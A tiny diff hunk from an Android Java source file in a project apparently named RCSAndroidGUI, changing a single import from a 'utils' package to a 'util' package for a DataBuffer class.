@@ -13,7 +13,7 @@ import java.util.Date;
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Debug;
-import com.ht.RCSAndroidGUI.utils.DataBuffer;
+import com.ht.RCSAndroidGUI.util.DataBuffer;
 
 // TODO: Auto-generated Javadoc
 /**
